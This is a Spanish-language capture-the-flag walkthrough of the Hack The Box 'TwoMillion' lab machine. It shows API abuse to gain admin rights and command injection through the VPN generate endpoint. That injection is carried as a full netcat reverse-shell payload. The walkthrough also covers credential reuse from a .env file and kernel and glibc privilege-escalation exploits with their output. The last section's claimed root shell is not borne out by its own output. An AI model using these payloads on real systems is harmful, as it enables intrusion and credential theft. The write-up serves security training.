---
title: "TwoMillion"
status: finalizado
---
## Contenido

- [TwoMillion](#lessso-section-twomillion-1)
  - [Details](#lessso-section-details-2)
  - [Information Gathering](#lessso-section-information-gathering-3)
      - [1. How many TCP ports are open?](#lessso-section-1-how-many-tcp-ports-are-open-4)
      - [2. What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?](#lessso-section-2-what-is-the-name-of-the-javascript-file-loaded-by-the-invite-p-5)
      - [3. What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.](#lessso-section-3-what-javascript-function-on-the-invite-page-returns-the-first--6)
      - [4. The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?](#lessso-section-4-the-endpoint-in-makeinvitecode-returns-encrypted-data-that-mes-7)
      - [5 What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?](#lessso-section-5-what-is-the-path-to-the-endpoint-the-page-uses-when-a-user-cli-8)
      - [6. How many API endpoints are there under /api/v1/admin?](#lessso-section-6-how-many-api-endpoints-are-there-under-api-v1-admin-9)
      - [7. What API endpoint can change a user account to an admin account?](#lessso-section-7-what-api-endpoint-can-change-a-user-account-to-an-admin-accoun-10)
      - [8. What API endpoint has a command injection vulnerability in it?](#lessso-section-8-what-api-endpoint-has-a-command-injection-vulnerability-in-it-11)
      - [9. What file is commonly used in PHP applications to store environment variable values?](#lessso-section-9-what-file-is-commonly-used-in-php-applications-to-store-enviro-12)
      - [10. Submit the flag located in the admin user's home directory.](#lessso-section-10-submit-the-flag-located-in-the-admin-user-s-home-directory-13)
      - [11. What is the email address of the sender of the email sent to admin?](#lessso-section-11-what-is-the-email-address-of-the-sender-of-the-email-sent-to--14)
      - [12. What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?](#lessso-section-12-what-is-the-2023-cve-id-for-a-vulnerability-in-that-allows-an-15)
      - [13. Submit the flag located in root's home directory.](#lessso-section-13-submit-the-flag-located-in-root-s-home-directory-16)
      - [14. \[Alternative Priv Esc\] What is the version of the GLIBC library on TwoMillion?](#lessso-section-14-alternative-priv-esc-what-is-the-version-of-the-glibc-library-17)
      - [15. \[Alternative Priv Esc\] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?](#lessso-section-15-alternative-priv-esc-what-is-the-cve-id-for-the-2023-buffer-o-18)
      - [16. \[Alternative Priv Esc\] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.](#lessso-section-16-alternative-priv-esc-with-a-shell-as-admin-or-www-data-find-a-19)

## Índice de tablas

- [Tabla 1 · Port · State · Service](#lessso-table-1)

<a id="lessso-section-twomillion-1"></a>

# TwoMillion
TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.


<a id="lessso-section-details-2"></a>

## Details
Tenemos la siguiente información:
- IP: 10.129.180.0
- Ports: 22, 80


<a id="lessso-section-information-gathering-3"></a>

## Information Gathering
Para saber que servicios y en que puertos estan corriendo, utilizaré la herramienta de *nmap*
```bash
sudo nmap -Pn -n -p- --min-rate=10000 --open -sS 10.129.180.0
```


Resultado obtenido:
<a id="lessso-table-1"></a>

| Port     | State | Service |
|----------|-------|---------|
| 22/TCP   | Open  | ssh     |
| 80/TCP   | Open  | http    |


Con este resultado pondremos la IP en el navegador para ver que resultado arroja.
Resultado obtenido:
```Information
2million.htb’s DNS address could not be found. Diagnosing the problem.
```


Con esto nos damos cuenta de que debemos de agregar *2million.htb* a nuestra ruta:
```bash
sudo nano /etc/hosts
```


A esa ruta le pondremos en un apartado lo siguiente:
```bash
10.129.180.0 2million.htb
```


Con esto podemos regresar al navegador y recargar, el resultado obtenido fue:

Es una página completamente accesible.
Una vez estando ahí iremos viendo que nos pide HTB para ver como avanzar, aunque para mi es la intercepción de algunos paquetes.


<a id="lessso-section-1-how-many-tcp-ports-are-open-4"></a>

#### 1. How many TCP ports are open?
Para obtener la respuesta a esto utilizaremos el comando:
```bash
sudo nmap -Pn -n -p- --min-rate=10000 --open -sS 10.129.180.0
```


Con eso obtuvimos la respuesta de:
```Answer
2
```


<a id="lessso-section-2-what-is-the-name-of-the-javascript-file-loaded-by-the-invite-p-5"></a>

#### 2. What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?
- Para obtener la respuesta realizaremos:
```Keyboard
f12
```


Con eso utilizamos el siguiente url:
```Web
http://2million.htb/invite
```


Luego nos fuimos a la configuración de la página utilizando:
```Web
Click derecho -> Inspect
```


Como resultado obtenemos un panel web como el que se ve a continuación:

Podemos observar en el panel que hay una flecha que apunta a *Network*, lo que haremos es ir ahí y nos aparecerá el siguiente panel:

Como podemos observar hay dos recursos, para que aparezcan hay que darle click a recargar página, dónde apunta la flecha, ahí mismo encontramos el recurso que nos dará la respuesta:
```Resource
inviteapi.min.js
```


<a id="lessso-section-3-what-javascript-function-on-the-invite-page-returns-the-first--6"></a>

#### 3. What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.
Para responder esta pregunta es necesario ingresar al archivo previamente encontrado *(inviteapi.min.js)*, lugar donde encontraremos mucho texto sin estilo, podemos utilizar en la terminal jq o la página [de4js](https://thanhle.io.vn/de4js/) para darle formato, yo utilizaré la terminal con jq, en el siguiente resultado veremos con formato todo y encontraremos el nombre de la función que nos piden. Para eso iremos a la página de4js que nos ayudará, el resultado obtenido fue:


```bash
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```


Como podemos observar, el resultado a la pregunta fue:
```Information
makeInviteCode
```


<a id="lessso-section-4-the-endpoint-in-makeinvitecode-returns-encrypted-data-that-mes-7"></a>

#### 4. The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?
Realmente es sencillo, en la misma parte nos dice que está codificado en:
```Answer
ROT13
```


<a id="lessso-section-5-what-is-the-path-to-the-endpoint-the-page-uses-when-a-user-cli-8"></a>

#### 5 What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?
Para responder esta pregunta realizaremos en la terminal:
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```


Nos habrá dado como resultado:
```Information
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```


> [!NOTE] 
Como podemos observar, no tiene estilo, volveremos a utilizar la página recomendada para darle estilo y ver que dice, cabe resaltar que hay maneras más eficientes, pero para lo que hemos mirado, es lo que deberíamos de hacer.


Con el fin de tener más orden utilizamos la herramienta recomendada de *de4js*, como resultado obtuvimos:
```Information
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```


Utilizaremos para desencriptar la terminal, pero podemos buscar en la web '*Desencriptar texto en ROT13*', para eso yo utilizaré el siguiente comando:
```bash
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```


Como resultado hemos obtenido:
```Information
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```


Bueno, como dice ahí, debemos hacer una consulta POST a la ruta que dice ahí.
Lo haremos utilizando el siguiente comando:
```bash
curl -X POST 2million.htb/api/v1/invite/generate
```


Como resultado de realizar esa petición hemos obtenido:
```Information
{"0":200,"success":1,"data":{"code":"NVdOSzctNVVKVlEtQTVRQkItSEJIUUM=","format":"encoded"}}
```


Utilizaremos ese resultado de *code* e investigaremos en que formato está encriptado. Utilizaremos como recurso la página que nos da www.hackthebox.com, la cual es: [Binary to text encode](https://en.wikipedia.org/wiki/Binary-to-text_encoding), como resultado a la pregunta es:
```Answer
Base64
```


Desencriptaremos ese resultado utilizando la página: [Base 64 Decode and Encode](https://www.base64decode.org/) y como resultado hemos obtenido:
```Information
5WNK7-5UJVQ-A5QBB-HBHQC
```


Utilizaremos ese código para ingresar, nos registraremos y llenaremos con la  información que necesita, puede ser inventado, no hay necesidad de ingresar datos verdaderos. Y al final nos logearemos con la información que llenamos.
Este es el panel al que entramos:

Luego buscaremos el botón *Connection Pack*, una vez que lo encontremos utilizaremos BurpSuit para ver a que endpoint apunta.
El apartado de  *Connection Pack* se encuentra en la sección de *Access* que aparece del lado izquierdo y se ve:

Para ver el endpoint podemos simplemente pasar el mouse por encima del botón, utilizar Burp Suit, utilizar herramientas más avanzadas del navegador, etc. Lo más sencillo es pasar el mouse por el navegador y eso haré, entonces el resultado fue:

La respuesta a la pregunta es:
```Answer
2million.htb/api/v1/user/vpn/generate
```


<a id="lessso-section-6-how-many-api-endpoints-are-there-under-api-v1-admin-9"></a>

#### 6. How many API endpoints are there under /api/v1/admin?
Para responder esta pregunta en realizar es sencillo, simplemente escribiremos en la url del navegador:
```Web
http://2million.htb/api/v1
```


Como resultado obtuvimos:
```Information
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```


Como se puede observar le hace falta forma, utilizaremos la página que utilizamos anteriormente de de4js para darle formato, y el resultado del formato fue:
```Information
{
    "v1": {
        "user": {
            "GET": {
                "\/api\/v1": "Route List",
                "\/api\/v1\/invite\/how\/to\/generate": "Instructions on invite code generation",
                "\/api\/v1\/invite\/generate": "Generate invite code",
                "\/api\/v1\/invite\/verify": "Verify invite code",
                "\/api\/v1\/user\/auth": "Check if user is authenticated",
                "\/api\/v1\/user\/vpn\/generate": "Generate a new VPN configuration",
                "\/api\/v1\/user\/vpn\/regenerate": "Regenerate VPN configuration",
                "\/api\/v1\/user\/vpn\/download": "Download OVPN file"
            },
            "POST": {
                "\/api\/v1\/user\/register": "Register a new user",
                "\/api\/v1\/user\/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "\/api\/v1\/admin\/auth": "Check if user is admin"
            },
            "POST": {
                "\/api\/v1\/admin\/vpn\/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "\/api\/v1\/admin\/settings\/update": "Update user settings"
            }
        }
    }
}
```


Para responder a la pregunta solamente hay que contar los endpoints que llevan admin en su ruta y su resultado es:
```Anwser
3
```


<a id="lessso-section-7-what-api-endpoint-can-change-a-user-account-to-an-admin-accoun-10"></a>

#### 7. What API endpoint can change a user account to an admin account?
Para responder esta pregunta debemos (por lo que se apenas) ir probando cada endpoint hasta ver que información revela cada uno. Como cada uno es diferente, toca realizar diferentes peticiones.


En realidad era más sencillo de lo que parecía, en la parte de cuando mejoramos la vista del Json decia que hacia cada endpoint, sin embargo, podiamos realizar pruebas con los diferentes métodos, sin embargo la respuesta es:
```Answer
/api/v1/admin/settings/update
```


Aprovechando que puedo hacer uso de esa API, intentaré darme permisos, veré primero que necesito para hacerlo, utilizaré el comando:
```bash
curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i"
```


Obtuvimos como respuesta:
```Information
┌─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i"
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 08:21:05 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Missing parameter: email"}                      
```


Llenaremos la información que nos pide, en este caso el email y volveremos a realizar la petición:
```bash
curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -d '{"email":"h@h.h"}'
```


Como resultado obtuvimos:
```Information
┌─[✗]─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -d '{"email":"h@h.h"}'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 08:23:51 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Missing parameter: is_admin"}                   
┌─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $
```


No conozco que formato utiliza el parametro *is_admin* por lo cual ingresaré cualquiera para ver que es lo que necesita, utilizaré el siguiente comando:
```bash
curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -d '{"email":"h@h.h","is_admin":true}'
```


Ahora obtuvimos la respuesta a eso, el cual fue:
```Information
┌─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -d '{"email":"h@h.h","is_admin":true}'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 08:24:47 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}  
```


Ahora si lo haremos de manera correcta utilizando el parametro correcto, en este caso sería *1* y solo cambiaremos el parametro *true* por el *1*, como resultado de ese cambio obtuvimos:
```Information
┌─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $curl -X PUT -i http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -d '{"email":"h@h.h","is_admin":1}'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 08:27:30 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"id":14,"username":"admin","is_admin":1}                                     
```


Podemos realizar la comprobación utilizando el endpoint para comprobar si somos administradores, el endpoint es: */api/v1/admin/auth*, aplicaremos lo mismo que antes, iremos verificando que parametros hacen falta y los llenaremos hasta obtener una respuesta. Empezaré con el comando:
```bash
curl -X GET -i http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -H "Content-Type: application/json"
```


El resultado que obtuvimos fue:
```Information
┌─[✗]─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $curl -X GET -i http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i" -H "Content-Type: application/json"
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 08:31:22 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"message":true}                                                              
┌─[juanromero@parrot]─[~/Documents/HTB]
└──╼ $
```


El resultado es favorable, somos administradores.


<a id="lessso-section-8-what-api-endpoint-has-a-command-injection-vulnerability-in-it-11"></a>

#### 8. What API endpoint has a command injection vulnerability in it?
Creo que podemos realizar esto mirando que información pide cada uno, más que nada los que permiten escritura, lectura o actualización, en teoría revisaré varios pero primero por los que modifican algo y necesiten permisos de administrador.


Bueno, como lo dije, empezaré por indagar en el endpoint */api/v1/admin/vpn/generate*, utilizaré el siguiente comando:
```bash
curl -X POST -i http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" --cookie "PHPSESSID=chv43ltif2a5i8n1bgc36f1f8i"
```


El resultado que obtuve fue:
```Information
{"status":"danger","message":"Missing parameter: username"}
```


Con esto solamente llenaré los parametros que hacen falta y volveré a correr el programa, pero esta vez le agregaré al comando un parametro junto a un filtro para ver el resultado, los parametros extr son:
```bash 
$([comando]) | grep -i "Subject"
```
Ahora si, el comando completo sería:
```bash
curl -s -X POST -i http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" --cookie "PHPSESSID=1tt1aqiejbasq0da2sbapajt7h" -d '{"username":"a$(whoami)"}' | grep -i "Subject"
```


Con eso obtuvimos:
```Information
╭─ juanromero@debian ╱ ~
╰─❯ curl -s -X POST -i http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" --cookie "PHPSESSID=1tt1aqiejbasq0da2sbapajt7h" -d '{"username":"a$(whoami)"}' | grep -i "Subject"
        Subject: C=GB, ST=London, L=London, O=awww-data, CN=awww-data
        Subject Public Key Info:
            X509v3 Subject Key Identifier: 
```


Con esto hemos obtenido la respuesta:
```Answer
/api/v1/admin/vpn/generate
```


<a id="lessso-section-9-what-file-is-commonly-used-in-php-applications-to-store-enviro-12"></a>

#### 9. What file is commonly used in PHP applications to store environment variable values?
Este es relativamente sencillo, aplica para varios entornos, la respuesta es:
```Answer
.env
```


<a id="lessso-section-10-submit-the-flag-located-in-the-admin-user-s-home-directory-13"></a>

#### 10. Submit the flag located in the admin user's home directory.
Para realizar esto necesitamos ganar acceso a la máquina, ya tenemos el endpoint que permite realizar *command injection*, para eso indagué bastante, una de las cosas recomendadas es utilizar el comando:
```bash
echo $0 #
```


El resultado que obtenemos es:
```Information
╭─ juanromero@debian ╱ ~
╰─❯ curl -s -X POST -i http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" --cookie "PHPSESSID=1tt1aqiejbasq0da2sbapajt7h" -d '{"username":"a; echo $0 #"}'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 16 Nov 2026 10:52:41 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

sh
```


Con esto sabemos que podemos hacer command injection, por lo cual ahora pasaremos a la página https://www.revshells.com/ e indagaremos en cual reverse shell utilizar. Yo utilizaré el que es *nc mkinfo*, más que nada fue porque el que me funcionó.
Terminal 1:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP de nuestra máquina] [Puerto] >/tmp/f
```
> [!Note] Recordar cambiar lo que se encuentra dentro de los "[]"


El comando completo quedaría:
```bash
curl -X POST -i http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username":"a; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 6969 >/tmp/f"}' --cookie "PHPSESSID=1tt1aqiejbasq0da2sbapajt7h"
```


Terminal 2:
En otra terminal utilizaremos *netcat* para estar escuchando en el puerto 6969 y lograr la conexión. Entonces utilizamos el comando:
```bash
nc -lvnp 6969
```


Tenemos que correr primero la Terminal 2, luego la Terminal 1, una vez que lo hagamos en ese orden obtendremos lo siguiente:
- Terminal #1:
- Terminal #2: Acá corrí *whoami* para confirmar la salida de cuando probé si aceptaba command injection;

Recordando la información de hace rato, nos habló de una variable de entorno, por la cual realizaré:
```bash
ls -la
```


El resultado de esa acción fue:

Ahora haré:
```bash
cat .env
```


Ahora el resultado fue:
```Information
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
$ 
```


Podemos intentar acceder mediante ssh a la maquina del administrador intentando ese usuario y credenciales, el comando para hacerlo se tiene que realizar desde nuestra maquina y sería:
```
ssh [user]@[ip] -p
```


Obtuvimos como resultado:
```Information
╭─ juanromero@debian ╱ ~
╰─❯ ssh admin@10.129.229.66
admin@10.129.229.66's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov 16 11:10:37 AM UTC 2026

  System load:           0.0
  Usage of /:            73.8% of 4.82GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             239
  Users logged in:       1
  IPv4 address for eth0: 10.129.229.66
  IPv6 address for eth0: dead:beef::a0de:adff:fe5b:7f6d

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Mon Nov 16 10:48:56 2026 from 10.10.14.5
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```


Con esto podemos indagar un poco más, realizaré:
```bash
ls -la # En el directorio en el que me encuentro.
```


El resultado obtenido fue:
```Information
admin@2million:~$ ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jun  6  2023 .
drwxr-xr-x 3 root  root  4096 Jun  6  2023 ..
lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin 3771 May 26  2023 .bashrc
drwx------ 2 admin admin 4096 Jun  6  2023 .cache
-rw-r--r-- 1 admin admin  807 May 26  2023 .profile
drwx------ 2 admin admin 4096 Jun  6  2023 .ssh
-rw-r----- 1 root  admin   33 Nov 16 09:00 user.txt
admin@2million:~$ 
```


Ahora realizaré:
```bash
cat user.txt
```


El resultado del archivo user.txt fue:
```Answer
22fc0f6862b949c8c7c2268a9ead880b
```


<a id="lessso-section-11-what-is-the-email-address-of-the-sender-of-the-email-sent-to--14"></a>

#### 11. What is the email address of the sender of the email sent to admin?
Este es super sencillo, bueno, es que me conozco un poco las flags de ls y en este caso serán utiles ya que también busca entre archivos de texto, lo que haremos será lo siguiente:
```bash
cd ../../../
ls -la -R . | grep ".htb" 2>dev/null
```


Muy probablemente tendremos muchisima información innecesaria, por lo cual podemos investigar poco a poco o indagar más de como sería más sencillo buscar, por suerte yo logré encontrar lo siguiente:
```Information
var/mail/admin:From: ch4p <ch4p@2million.htb>
var/mail/admin:To: admin <admin@2million.htb>
var/mail/admin:Cc: g0blin <g0blin@2million.htb>
var/mail/admin:Message-ID: <9876543210@2million.htb>
```


Como podemos observar, ahí está la sintaxis que nos hace falta, podemos ahora si buscar siendo un poco más especificos, haremos:
```bash
ls -la -R . | grep -ri "@2million.htb" 2>dev/null
```


Bueno, adelanto el resultado, no logré obtener información nueva, sin embargo, simplemente lo dejaré corriendo e indagaré más en la ruta que ya habiamos obtenido antes, entonces haré:
```bash
cd /var/mail
cat admin
```


Y como resultado ese archivo contiene lo siguiente:
```Information
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```


Podemos confirmar con certeza que la respuesta es:
```Answer
ch4p@2million.htb>
```


<a id="lessso-section-12-what-is-the-2023-cve-id-for-a-vulnerability-in-that-allows-an-15"></a>

#### 12. What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?
Realmente es sencillo responder, viene en el correo el nombre de la vulnerabilidad, simplemente lo googlee y el resultado fue:
```Answer
CVE-2023-0386
```


<a id="lessso-section-13-submit-the-flag-located-in-root-s-home-directory-16"></a>

#### 13. Submit the flag located in root's home directory.
Al parecer para lograr obtener la flag debemos realizar la explotación a la vulnerabilidad que comentaron, tocará buscar más información.



Okay, indagando más en la red, encontré la página en la que me basaré, consulté con la IA y me confirma que es la correcta, lo hago con ese por la transparencia, en la red encontré más pero no me dan confianza.
URL: https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/



Pasos a realizar:
```Steps
1. Clonar el repo de Github: git clone https://github.com/xkaneiki/CVE-2023-0386.git
2. Comprimir la carpeta
3. Levantar servidor para poder extraer la carpeta.
Utilizaré: python3 -m http.server [port]
4. Obtenemos el archivo con wget [url]
5. Descomprimimos el archivo
6. Entramos al directorio CVE...
7. Hacemos lo que dice el repo de GitHub en la terminal 1 y 2.
```


En la terminal 1 tenemos:
```Information
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0

[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```


En la terminal 2 tenemos:
```Information
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 16 12:09 .
drwxrwxr-x 6 root   root     4096 Nov 16 12:09 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```


Como podemos observar, tenemos acceso root, ahora podemos extraer la flag de root, simplemente hacemos:
```bash
cat /root/root.txt
```


Obtenemos la flag y respuesta:
```Answer
8e8b14eea152d73a88e1f57072c8aab2
```


<a id="lessso-section-14-alternative-priv-esc-what-is-the-version-of-the-glibc-library-17"></a>

#### 14. [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?
Es realmente sencillo, pero si me quedará pendiente investigar que es eso, lo obtenemos realizando:
```bash
ldd --version
``` 


Como resultado obtuvimos:
```Answer
2.35
```


<a id="lessso-section-15-alternative-priv-esc-what-is-the-cve-id-for-the-2023-buffer-o-18"></a>

#### 15. [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?
Para esto recurriremos a Google.
Respuesta:
```Answer
CVE-2023-4911
```


<a id="lessso-section-16-alternative-priv-esc-with-a-shell-as-admin-or-www-data-find-a-19"></a>

#### 16. [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.
El resultado de la busqueda anterior nos dió la respuesta para esta pregunta tambié, resultado de la busqueda de la pregunta anterior:
```Information
The CVE ID for the 2023 buffer overflow vulnerability in the GNU C Library's dynamic loader is CVE-2023-4911. 

Key details:

Vulnerability Type: Heap-based buffer overflow (CWE-122) in ld.so. 
Trigger: Maliciously crafted GLIBC_TUNABLES environment variable. 
Impact: Local privilege escalation, allowing attackers to gain full root privileges by exploiting binaries with SUID permissions. 
CVSS Score: 7.8 (High).
Affected Versions: Primarily glibc 2.34–2.38. 
Discovery: Identified by Qualys Research Labs in October 2023. 
Nickname: Often referred to as "Looney Tunables". 
```


Respuesta:
```Answer
GLIBC_TUNABLES
```


Bueno, para realizar la escalada aprovecharemos que somos usuarios root y realizaremos los mismos pasos, enlace del repo para los pasos finales *https://github.com/RickdeJager/CVE-2023-4911*:
```steps
1. Clonar repo
2. Comprimir archivo
3. Exponer servidor
4. Descargar archivo
5. Extraer archivo
6. Seguir los pasos del repo para realizar la explotación
```


Como resultado obtuvimos:
```Information
admin@2million:/tmp/CVE-2023-4911$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```


---

{#Easy} {#Linux}


